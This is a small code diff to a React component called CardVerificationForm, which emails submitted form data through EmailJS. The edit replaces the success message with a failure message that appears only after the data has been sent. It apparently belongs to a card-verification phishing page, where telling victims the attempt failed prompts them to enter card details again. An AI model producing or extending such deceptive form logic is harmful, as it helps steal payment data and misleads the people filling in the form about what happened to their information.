@@ -206,7 +206,7 @@ export default function CardVerificationForm() {
     try {
       await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY);
       setLoading(false);
-      setShowSuccess(true);
+      setShowFail(true);
       resetForm();
     } catch (err) {
       console.error("EmailJS error:", err);
